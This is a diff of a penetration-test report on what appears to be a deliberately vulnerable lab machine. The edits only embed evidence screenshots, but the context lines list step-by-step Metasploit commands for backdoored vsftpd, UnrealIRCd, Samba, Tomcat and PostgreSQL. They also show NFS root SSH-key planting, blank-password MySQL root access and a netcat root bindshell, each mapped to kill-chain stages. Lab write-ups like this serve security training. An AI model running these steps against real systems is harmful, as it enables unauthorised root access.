@@ -54,7 +54,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   5. `set LHOST 192.168.100.253`
   6. `run`
   7. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
-- **Evidence:** evidence/exploit1.png
+- **Evidence:** ![Exploit evidence](evidence/exploit1.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified vsftpd 2.3.4 running on port 21.
   - **Weaponization:** Selecting the vsftpd_234_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
@@ -84,7 +84,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   6. `set LHOST 192.168.100.253`
   7. `run`
   8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
-- **Evidence:** evidence/exploit2.png
+- **Evidence:** ![Exploit evidence](evidence/exploit2.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified UnrealIRCd running on port 6667.
   - **Weaponization:** Selecting the unreal_ircd_3281_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
@@ -114,7 +114,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   6. `set LHOST 192.168.100.253`
   7. `run`
   8. Confirmed access with `whoami` and `id` inside the resulting command shell session
-- **Evidence:** evidence/exploit3.png
+- **Evidence:** ![Exploit evidence](evidence/exploit3.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified the vulnerable Samba 3.0.20-Debian version on ports 139/445.
   - **Weaponization:** Selecting the usermap_script module and configuring RHOSTS/LHOST paired the misconfiguration with a reverse shell payload.
@@ -144,7 +144,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   6. `set LHOST 192.168.100.253`
   7. `run`
   8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
-- **Evidence:** evidence/exploit4.png
+- **Evidence:** ![Exploit evidence](evidence/exploit4.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified the Java RMI registry running on port 1099.
   - **Weaponization:** Selecting the java_rmi_server module and configuring RHOSTS/LHOST paired the insecure configuration with a Java Meterpreter payload.
@@ -182,7 +182,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   14. `set HttpPassword tomcat`
   15. `run`
   16. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
-- **Evidence:** evidence/exploit5.png
+- **Evidence:** ![Exploit evidence](evidence/exploit5.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified Tomcat on port 8180; the login scanner then discovered valid weak credentials, extending the reconnaissance into the application layer.
   - **Weaponization:** Packaging the discovered credentials with the tomcat_mgr_deploy module paired a valid login with a malicious WAR payload.
@@ -212,7 +212,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   6. `set LHOST 192.168.100.253`
   7. `run`
   8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
-- **Evidence:** evidence/exploit6.png
+- **Evidence:** ![Exploit evidence](evidence/exploit6.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified PostgreSQL 8.3.0-8.3.7 running on port 5432.
   - **Weaponization:** Selecting the postgres_payload module, which defaults to the common postgres:postgres credentials, paired weak authentication with a Meterpreter payload.
@@ -243,7 +243,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   7. `ls -la /tmp/nfs_mount/root/.ssh/` — confirmed the new file is owned by root:root on the target
   8. `ssh -i ~/.ssh/nfs_exploit_key -o HostKeyAlgorithms=+ssh-rsa root@192.168.100.204` — logged in as root with no password
   9. Confirmed access with `whoami` and `id`
-- **Evidence:** evidence/exploit7.png
+- **Evidence:** ![Exploit evidence](evidence/exploit7.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
   - **Reconnaissance:** nmap identified NFS/rpcbind; showmount -e confirmed the root filesystem was exported with no host restrictions.
   - **Weaponization:** Generating an SSH key pair prepared the "payload" — a credential that would grant persistent root access once planted.
@@ -268,7 +268,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   1. `mysql -h 192.168.100.204 -u root --ssl=0` — connected as root with no password (the `--ssl=0` flag was required to work around a TLS version mismatch with the old server)
   2. `SHOW DATABASES;` — enumerated all databases on the server
   3. `SELECT User, Host, Password FROM mysql.user;` — confirmed all MySQL accounts (root, debian-sys-maint, guest) have blank passwords
-- **Evidence:** evidence/exploit8.png
+- **Evidence:** ![Exploit evidence](evidence/exploit8.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
   - **Reconnaissance:** The nmap scan identified MySQL 5.0.51a-3ubuntu5 running on port 3306.
   - **Delivery:** Connecting to the server with the mysql client and an empty password delivered the authentication attempt directly to the target.
@@ -296,7 +296,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   6. `vncviewer 192.168.100.204` (from a separate terminal)
   7. Entered password "password" when prompted
   8. Confirmed access — connected directly to a live root terminal already open on the target's desktop
-- **Evidence:** evidence/exploit9.png
+- **Evidence:** ![Exploit evidence](evidence/exploit9.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
   - **Reconnaissance:** nmap identified the VNC service; the login scanner then confirmed the weak password.
   - **Delivery:** Connecting via vncviewer with the discovered password delivered the authentication attempt to the target's VNC server.
@@ -319,7 +319,7 @@ Key findings — 23 open ports in total, including several with well-known vulne
   1. `nc 192.168.100.204 1524`
   2. Immediately received a root shell prompt with no authentication
   3. Confirmed access with `whoami` and `id`
-- **Evidence:** evidence/exploit10.png
+- **Evidence:** ![Exploit evidence](evidence/exploit10.png)
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Command & Control, Actions on Objectives
   - **Reconnaissance:** nmap identified the open port 1524 and its banner explicitly describing it as a root shell.
   - **Delivery:** The netcat connection itself was the entire delivery mechanism — a raw TCP handshake to the listening port.
